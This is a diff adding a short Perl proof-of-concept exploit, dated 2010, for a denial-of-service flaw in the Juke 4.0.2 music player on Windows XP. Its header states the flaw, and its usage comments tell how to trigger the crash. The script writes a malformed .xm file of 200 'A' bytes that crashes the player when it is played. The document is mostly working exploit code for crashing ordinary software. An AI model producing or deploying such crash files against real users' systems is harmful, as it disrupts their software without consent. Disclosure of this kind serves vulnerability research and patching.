@@ -1,0 +1,27 @@
+# Exploit Title: Juke 4.0.2 DoS Multiple Files 
+# Date: April 6, 2010
+# Software Link: [http://www.wolosoft.com/en/download.html]
+# Version: 4.0.2
+# Tested on: Windows XP SP3
+# Author: [anonymous]
+#
+# Juke will Crash when you run this script to make 
+# a file with any of the following extensions
+# .xm .nst .s3m .stm .mod
+#
+# Usage: Run Script -> Add file with + -> Press Play
+#!/usr/bin/perl
+
+my $music = "tunes.xm";
+my $mic = "\x41" x 200;
+ 
+print "Creating File . . .\n";
+sleep(1);
+
+open (FILE, ">$music");
+print FILE "$mic";
+close FILE;
+
+print "\nIt's a mix between Jazz and Funk, it's called Junk!";
+
+
